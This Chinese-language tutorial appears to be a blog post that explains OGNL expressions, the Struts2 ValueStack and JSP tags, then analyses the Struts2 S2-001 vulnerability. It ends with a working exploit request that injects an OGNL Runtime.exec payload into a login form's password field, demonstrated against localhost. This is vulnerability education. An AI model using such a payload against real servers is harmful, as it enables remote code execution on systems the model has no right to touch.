Struts2这个框架每年都会出现那么几个漏洞，不得不引起斗哥学习的兴趣。本期将从Struts2的一个罪魁祸首ONGL表达式开始介绍到S2-001漏洞的分析。Struts2系列的漏洞涉及Java
Web等相关内容，后续会持续更新漏洞分析以及相关知识背景介绍等。

 **0x00 什么是ognl**

OGNL全称是对象视图导航语言（Object-Graph Navigation
Language），它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。

 **0x01 ognl的核心OgnlContext对象**

OgnlContext对象是Ognl的核心，需要一个上下文环境。又分为两个部分，分别是Root对象和Context对象,Root对象所在的环境就是OGNL的上下文环境（Context）。上下文环境规定了OGNL的操作“在哪里进行”。上下文环境Context是一个MAP类型的对象，在表达式中访问Context的对象，需要使用#号加上对象名称，即#对象名称的形式。

比如我们有一个User对象： User.Java

    
    
    public class User {
    
       private String name;
    
       private Integer age;
    
       public User() {
    
           super();
    
       }
    
       public User(String name, Integer age) {
    
           super();
    
           this.name = name;
    
           this.age = age;
    
       }
    
       public String getName() {
    
           return name;
    
       }
    
       public void setName(String name) {
    
           this.name = name;
    
       }
    
       public Integer getAge() {
    
           return age;
    
       }
    
       public void setAge(Integer age) {
    
           this.age = age;
    
       }
    
    }
    

那针对User对象，Root的方式：

    
    
    User rootUser = new User("tom",18);
    

Context的方式：

    
    
    Map<String,User> context = new HashMap<String,User>();
    
    context.put("user1",new User("jack",20));
    
    context.put("user2",new User("rose",22));
    

创建OgnlContext对象：

    
    
    OgnlContext oc = new OgnlContext();
    
    oc.setRoot(rootUser);
    
    oc.setValues(context);
    

取出root中User对象的name和age属性。这里可以使用getValue这个方法，其中第一个参数是就是OGNL表达式。

    
    
    String name = (String) Ognl.getValue("name",oc,oc.getRoot());
    
    Integer age = (Integer) Ognl.getValue("age",oc,oc.getRoot());
    
    System.out.println(age);
    
    System.out.println(name);
    

取出Context对象中的属性值，这里要加上#符号。

    
    
    String name1 = (String) Ognl.getValue("#user1.name",oc,oc.getRoot());
    
    String name2 = (String) Ognl.getValue("#user2.name",oc,oc.getRoot());
    
    Integer age1 = (Integer) Ognl.getValue("#user1.age",oc,oc.getRoot());
    
    Integer age2 = (Integer) Ognl.getValue("#user2.age",oc,oc.getRoot());
    
    System.out.println(name1);
    
    System.out.println(name2);
    
    System.out.println(age1);
    
    System.out.println(age2);
    

为root中的User对象的name属性赋值。

    
    
    Ognl.getValue("name='jerry'",oc,oc.getRoot());
    
    String name = (String) Ognl.getValue("name",oc,oc.getRoot());
    
    System.out.println(name);
    

为Context中的user1对象的name属性赋值。

    
    
    Ognl.getValue("#user1.name='reborn'",oc,oc.getRoot());
    
    String name1 = (String) Ognl.getValue("#user1.name",oc,oc.getRoot());
    
    System.out.println(name1);
    

getValue用来提取OGNL表达式运行后的值。下面是getValue可以传递的值：

    
    
    public static java.lang.Object getValue(java.lang.String expression,
    
                                               java.util.Map context,
    
                                               java.lang.Object root,
    
                                               java.lang.Class resultType)
    
                                        throws OgnlException
    

●java.lang.String expression 表达式

●java.util.Map context 上下文

●java.lang.Object root 表达式根对象

●java.lang.Class resultType 被转换的结果对象的类型

OGNL 的 API 设计得是很简单的，context 提供上下文，为变量和表达式的求值过程来提供命名空间，存储变量 等，通过 root
来指定对象图遍历的初始变量，使用 expression 来告诉 Ognl 如何完成运算。

演示ognl如何访问对象的方法：

1.创建一个 OgnlContext对象，context

2.创建一个 obj 对象 obj。 obj 的值等于 Ognl.getValue的值。

3.Ognl.getValue有2个参数。 "'helloworld'.length()"为表达式语句。

    
    
    import ognl.Ognl;
    
    import ognl.OgnlContext;
    
    import ognl.OgnlException;
    
    public class Ognltest {
    
       public static void main(String[] args) throws OgnlException {
    
           OgnlContext context = new OgnlContext();
    
           Object obj = Ognl.getValue("'helloworld'.length()",context);
    
           System.out.println(obj);
    
       }
    
    }
    

●ognl可以支持对象方法调用如：

    
    
    objName.methodName()
    

●ognl可以支持类的静态方法调用和值访问，表达式格式为：@[类全名(包括包路径)@[方法名|值名]],例如：调用java.lang.String类的format方法。

    
    
    @java.lang.String@format('foo %s','bar')
    

**0x02 ognl与Struts2的结合**

 **1.ValueStack**

Ognl表达式可以单独使用，它也被一些成熟的框架使用，如Struts2。在Struts2
中有个值栈对象即ValueStack。而说得通俗些，这个值栈就是OgnlContext。

而Ognl原有的root部分对应Struts2的栈，Context对应Struts2的ActionContext。

 **2.ValueStack特点**

ValueStack贯穿整个Action的生命周期（每个Action类的对象实例都拥有一个ValueStack对象），即用户每次访问struts的action，都会创建一个Action对象、值栈对象、ActionContext对象，然后把Action对象放入值栈中；最后再把值栈对象放入request中，传入jsp页面。相当于一个数据的中转站，在其中保存当前Action对象和其他相关对象。Struts2框架把ValueStack对象保存在名为struts。valueStack的request请求属性中。

 **0x03 JSP页面中获取ValueStack数据**

在jsp页面中，对不同ValueStack中的不同类型取值方法不同， 如果是根元素取值，直接写表达式；
非根元素(request，Session，application，att，parmeters)必须用#号，例#request.cn。

    
    
    <%@taglib prefix="s" uri="/struts-tags" %>
    
    <%@ page contentType="text/html;charset=UTF-8" language="java" %>
    
    <html>
    
     <head>
    
       <title>jsp页面取值</title>
    
     </head>
    
     <body>
    
    index页面
    
    <%--页面，必须要拿到ValueStack--%>
    
    <%--struts的调试标签，可以观测值栈数据--%>
    
    <s:debug/>
    
    <br/>1.取根元素的值<br/>
    
     <s:property value="user.id"/>
    
     <s:property value="user.name"/>
    
    <br/>2.取非根元素<br/>
    
     <s:property value="#request.cn"/>
    
     <s:property value="#request.request_data"/>
    
     <s:property value="#session.session_data"/>
    
     <s:property value="#application.application_data"/><br/>
    
    <%--attr按顺序自动找request/session/application,找到后立刻返回--%>
    
     <s:property value="#attr.application_data"/>
    
    <%--获取请求参数数据--%>
    
     <s:property value="#parameters.userName"/>
    
     </body>
    
    </html>
    

**0x04 Struts标签**

Ognl表达式取值。使用方式是：

1.引入<%@taglib prefix="s" uri="/struts-tags" %>

2.使用标签获取取值，取值的时候要注意根元素（全局变量）不用#号，其他的都用#号。

 **0x05 ognl的命令执行**

Java的命令执行可以借助java.lang.Runtime类的getRuntime方法。 如下：Run.java

    
    
    import java.io.IOException;
    
    import static java.lang.Runtime.getRuntime;
    
    public class Run {
    
       public static void main(String[] args) throws IOException {
    
           Process s = getRuntime().exec("calc");
    
       }
    
    }
    

![标准.jpg](https://image.3001.net/images/20180822/1534901628_5b7cbd7c9cd3e.jpg!small)

将上述代码按照@[类全名(包括包路径)@[方法名|值名]]书写表达式语句：

    
    
    @java.lang.Runtime@getRuntime().exec('calc')
    

![语句.webp.jpg](https://image.3001.net/images/20180822/1534901698_5b7cbdc247f00.jpg!small)

**0x06 s2-001漏洞分析**

该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value}
进行解析，然后重新填充到对应的表单数据中。

这里的表单是用JSP写的，需要对JSP有所了解，还需要去了解一下Struts2标签库常用的几个标签，这里有个参考链接：Struts2标签库常用标签。

例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL
表达式解析，这里重新填充动作是要有的，没有则不会触发漏洞。

LoginAction.class

    
    
    package com.demo.action;
    
    import com.opensymphony.xwork2.ActionSupport;
    
    public class LoginAction extends ActionSupport {
    
       private String username = null;
    
       private String password = null;
    
       public LoginAction() {
    
       }
    
       public String getUsername() {
    
           return this.username;
    
       }
    
       public String getPassword() {
    
           return this.password;
    
       }
    
       public void setUsername(String username) {
    
           this.username = username;
    
       }
    
       public void setPassword(String password) {
    
           this.password = password;
    
       }
    
       public String execute() throws Exception {
    
           if (!this.username.isEmpty() && !this.password.isEmpty()) {
    
               return this.username.equalsIgnoreCase("admin") && this.password.equals("admin") ? "success" : "error";
    
           } else {
    
               return "error";
    
           }
    
       }
    
    }
    

这段代码的意思是，接收发往/login.action的用户名和密码，如果两者不为admin,则返回error。

而查看struts.xml文件，发现返回error则跳转到index.jsp文件。

    
    
    <package name="S2-001" extends="struts-default">
    
     <action name="login" class="com.demo.action.LoginAction">
    
       <result name="success">/welcome.jsp</result>
    
       <result name="error">/index.jsp</result>
    
     </action>
    
    </package>
    

而index.jsp有表单如下：

    
    
    <s:form action="login">
    
       <s:textfield name="username" label="username" />
    
       <s:textfield name="password" label="password" />
    
       <s:submit></s:submit>
    
    </s:form>
    

最终我们构造请求如下，触发漏洞。

    
    
    [post]
    
    [http://127.0.0.1:8080/login.action](http://127.0.0.1:8080/login.action)
    
    [data]
    
    username=xxx&password=%25{%40java.lang.Runtime%40getRuntime().exec("calc")}
    

